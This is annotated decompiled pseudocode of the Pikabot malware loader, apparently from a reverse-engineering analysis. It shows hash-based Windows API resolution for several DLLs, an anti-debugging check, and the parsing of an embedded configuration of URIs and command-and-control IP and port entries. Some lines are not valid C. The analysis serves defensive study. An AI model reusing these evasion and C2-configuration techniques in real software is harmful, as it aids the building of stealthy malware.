void __cdecl fill_array_functions(int array_functions,int n_functions)
{
  i = 0;
  do {
    if (n_functions - 1U <= i) {
      return;
    }
    randN = getNonZero_RandomNumber();
    function = (undefined4 *)
             (array_functions +
             ((randN & 0x7fff) / ((int)(0x7fff / (n_functions - i)) + 1U) + i) * 4) ;
    function_ptr = *function;
    *function = *(undefined4 *)(array_functions + i * 4);
    *(undefined4 *)(array_functions + i * 4) = function_ptr;
    i = i + 1;
  } while( true );
}

undefined4 fill_advapi32(void)
{

  structPika = _pikabot_struct;
  ptr_2_advapi32 = get_dll2(local_19);
  *(int *)(structPika + 0x130) = ptr_2_advapi32;

  if (ptr_2_advapi32 == 0) {
    fillContentWithVal((int)local_19,0,0xd);
    success = 0;
  }
  else {
    fillContentWithVal((int)local_19,0,0xd); // poner a 0 la direccion de memoria donde aparece el nomnre de la DLL

    uVar4 = resolver(*(int *)(_pikabot_struct + 0x130),-0x15beaf30);
    *(uint *)(_pikabot_struct + 0xe8) = uVar4;

    uVar4 = resolver(*(int *)(structPika + 0x130),0x6af53d1b);
    *(uint *)(_pikabot_struct + 0xe4) = uVar4;

    uVar4 = resolver(*(int *)(structPika + 0x130),0x5883e280);
    *(uint *)(_pikabot_struct + 0xec) = uVar4;

    uVar4 = resolver(*(int *)(structPika + 0x130),-0x53dbcfe8);
    *(uint *)(_pikabot_struct + 0xf0) = uVar4;
    
    uVar4 = resolver(*(int *)(structPika + 0x130),0xaf60304);
    *(uint *)(_pikabot_struct + 0xf4) = uVar4;

    uVar4 = resolver(*(int *)(structPika + 0x130),-0x5861ea5a);
    *(uint *)(_pikabot_struct + 0xf8) = uVar4;

    success = 1;
  }
  return success;
}

undefined4 fill_netapi32(void)
{
  structPika = _pikabot_struct;
  ptr_2_netapi32 = get_dll2(acStack_19);
  *(int *)(structPika + 0x134) = ptr_2_netapi32;

  if (ptr_2_netapi32 == 0) {
    fillContentWithVal((int)acStack_19,0,0xd);
    success = 0;
  }
  else {
    fillContentWithVal((int)acStack_19,0,0xd);
    uVar2 = resolver(*(int *)(_pikabot_struct + 0x134),0x10b57bdf);
    *(uint *)(_pikabot_struct + 0xe0) = uVar2;
    success = 1;
  }
  return success;
}


bool fill_user32(void)
{
  structPika = _pikabot_struct;
  ptr_2_user32 = get_dll2(local_17);
  *(int *)(structPika + +0x12c) = ptr_2_user32;

  if (ptr_2_user32 == 0) {
    fillContentWithVal((int)local_17,0,0xb);
  }
  else {
    fillContentWithVal((int)local_17,0,0xb);

    uVar3 = resolver(*(int *)(_pikabot_struct + +0x12c),0x19fa5e7d);
    *(uint *)(_pikabot_struct + 0xc4) = uVar3;

    uVar3 = resolver(*(int *)(structPika + +0x12c),0x6a065d0e);
    *(uint *)(_pikabot_struct + 0xc8) = uVar3;

    uVar3 = resolver(*(int *)(structPika + +0x12c),-0x28873285);
    *(uint *)(_pikabot_struct + 0xcc) = uVar3;

    uVar3 = resolver(*(int *)(structPika + +0x12c),0xc0136f);
    *(uint *)(_pikabot_struct + 0xd0) = uVar3;

    uVar3 = resolver(*(int *)(structPika + +0x12c),-0x9d2972d);
    *(uint *)(_pikabot_struct + 0xd8) = uVar3;

    uVar3 = resolver(*(int *)(structPika + +0x12c),0x19fa5e67);
    *(uint *)(_pikabot_struct + 0xd4) = uVar3;
  }
  return ptr_2_user32 != 0;
}

undefined4 fill_winhttp(void)
{
  StructPika = _pikabot_struct;
  ptr_2_winhttp = get_dll2(&local_28);
  *(int *)(StructPika + 0x138) = ptr_2_winhttp;

  if (ptr_2_winhttp == 0) {
    fillContentWithVal((int)&local_28,0,0xc);
    success = 0;

  } else {
    fillContentWithVal((int)&local_28,0,0xc);

    uVar7 = resolver(*(int *)(_pikabot_struct + 0x138),-0x6d6ce377);
    *(uint *)(_pikabot_struct + 0x100) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),0x5fecc541);
    *(uint *)(_pikabot_struct + 0x104) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),-0x7f4480ce);
    *(uint *)(_pikabot_struct + 0x108) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),-0x13955664);
    *(uint *)(_pikabot_struct + 0x10c) = uVar7;

    uVar3 = resolver(*(int *)(StructPika + 0x138),0x77834e39);
    *(uint *)(_pikabot_struct + 0x120) = uVar3;

    uVar7 = resolver(*(int *)(StructPika + 0x138),0x4787c00a);
    *(uint *)(_pikabot_struct + 0x114) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),0x2ab66b05);
    *(uint *)(_pikabot_struct + 0x110) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),-0x3b9203f7);
    *(uint *)(_pikabot_struct + 0x118) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),0x1491ed2d);
    *(uint *)(_pikabot_struct + 0x11c) = uVar7;

    uVar7 = resolver(*(int *)(StructPika + 0x138),-0x59d9a297);
    *(uint *)(_pikabot_struct + 0xfc) = uVar7;

    success = 1;
  }
  return success;
}


void fill_structWebData(void)
{
  // recoge el valor de debuggerChecks
  sizeOfString = 0;
  mem_size = 0x966;
  content_ptr = 0x40f0a0;

  create_mem_iterator_struct(mem_struct, content_ptr, mem_size);
  fillContentWithVal(content_ptr, 0, mem_size);
  value = getNextVal((int)mem_struct);
  *(undefined4 *)(_pikabot_struct + 0x15c) = value; // debuggerChecks1

  next_content = getNextString((int)mem_struct, &sizeOfString);

  value = getNextVal((int)mem_struct);
  *(int *)(_pikabot_struct + 0x15c) = *(int *)(_pikabot_struct + 0x15c) + value; // debuggerChecks

  shift_and_check_DebuggerPresent(next_content, sizeOfString);
  create_mem_iterator_struct(struct_memory, next_content ,sizeOfString);
  call_LocalFree(mem_struct);

  value = getNextVal((int)struct_memory);
  *(undefined4 *)(_pikabot_struct + 0x160) = value;

  value = getNextVal((int)struct_memory);
  *(undefined4 *)(_pikabot_struct + 0x164) = value;

  value = getNextVal((int)struct_memory);
  *(undefined4 *)(_pikabot_struct + 0x168) = value;

  value = getNextVal((int)struct_memory);
  *(undefined4 *)(_pikabot_struct + 0x190) = value;

  next_content = (undefined *)call_getNextString((int)struct_memory, &sizeOfString);
  value = call_RtlAllocateHeap(sizeOfString + 2);
  *(undefined4 *)(val2 + 0x16c) = value;
  move_mem(*(undefined **)(_pikabot_struct + 0x16c),next_content, sizeOfString);

  next_content = (undefined *)call_getNextString((int)struct_memory,&sizeOfString);
  value = call_RtlAllocateHeap(i + 2);
  *(undefined4 *)(val2 + 0x170) = value;
  move_mem(*(undefined **)(_pikabot_struct + 0x170),next_content,i);

  next_content = (undefined *)call_getNextString((int)struct_memory,&sizeOfString);
  value = call_RtlAllocateHeap(i + 2);
  *(undefined4 *)(val2 + 0x174) = value;
  move_mem(*(undefined **)(_pikabot_struct + 0x174),next_content,i);

  next_content = (undefined *)call_getNextString((int)struct_memory,&sizeOfString);
  value = call_RtlAllocateHeap(i + 2);
  *(undefined4 *)(val2 + 0x194) = value;
  move_mem(*(undefined **)(_pikabot_struct + 0x194),next_content,i);

  value1 = getNextVal((int)struct_memory); // value1 = 4
  value = call_RtlAllocateHeap((value1 + 1) * 8);
  *(undefined4 *)(val2 + 0x19c) = value;
  
  for (j = 0; 4 != j; j = j + 1) {
    next_content = (undefined *)call_getNextString((int)struct_memory, &sizeOfString);

    ptr2_AllocHeap = *(int *)(_pikabot_struct + 0x19c);
    value = call_RtlAllocateHeap(sizeOfString + 2);
    *(undefined4 *)(ptr2_AllocHeap + j * 4) = value;

    fill_addr_with_val(*(int *)(*(int *)(_pikabot_struct + 0x19c) + j * 4),0, sizeOfString);
    move_mem(*(undefined **)(*(int *)(_pikabot_struct + 0x19c) + j * 4),next_content, sizeOfString);
  }

  *(undefined4 *)(*(int *)(_pikabot_struct + 0x19c) + (value1 + 1) * 4) = 0;

  URIcount = getNextVal((int)struct_memory);
  ptr2URIS = call_RtlAllocateHeap((URIcount + 1) * 8);
  *(undefined4 *)(val2 + 0x198) = ptr2URIS;

  i = 0;
  do {
    if (URIcount == i) {

      *(undefined4 *)(*(int *)(_pikabot_struct + 0x198) + (URIcount + 1) * 4) = 0;
      numberOfIPs = getNextVal((int)struct_memory);

      for (j = 0;  numberOfIPs != j; j = j + 1) {
        next_content = (undefined *)call_getNextString((int)struct_memory,&sizeOfString);
        val8bits = getNextVal8((int)struct_memory);
        val4bits = getNextVal((int)struct_memory);
        if (sizeOfString != 0) {
          store_concatenatedC2Data(next_content,sizeOfString,(int)val8bits,val4bits);
        }
      }

      IPcount = countIPs(irrelevant);
      *(int *)(_pikabot_struct + 0x180) = IPcount;

      NextIPdata = getNextIPData();
      *(int *)(_pikabot_struct + 0x178) = NextIPdata;

      call_LocalFree(struct_memory);
      return;
    }
    // fill URIs
    next_content = (undefined *)call_getNextString((int)struct_memory,&sizeOfString);
    ptr2URIS = *(int *)(_pikabot_struct + 0x198);
    mem = call_RtlAllocateHeap(sizeOfString + 2);
    *(undefined4 *)(ptr2URIS + i * 4) = mem;
    fillContentWithVal(*(int *)(*(int *)(_pikabot_struct + 0x198) + i * 4),0,sizeOfString + 2);
    ptrURI = i * 4;
    i = i + 1;
    move_mem(*(undefined **)(*(int *)(_pikabot_struct + 0x198) + ptrURI),next_content, sizeOfString);
    
  } while( true );
}

int * __cdecl store_concatenatedC2Data(undefined *content,int size,int port,int enableFeatures_flag)
{
  C2Data = (int *)call_RtlAllocateHeap(0x18);
  IP = call_RtlAllocateHeap(size + 2);
  *C2Data = IP;
  C2Data + 0x4 = port;
  C2Data + 0x8 = enableFeatures_flag;
  C2Data + 0x10 = 0; // is_unavailable
  C2Data + 0x14 = *(int *)(_pikabot_struct + 0x17c);
  fillContentWithVal(address,0,size + 2);
  move_Mem((undefined *)*C2Data, content, size);
  *(int **)(_pikabot_struct + 0x17c) = C2Data;
  return C2Data;
}

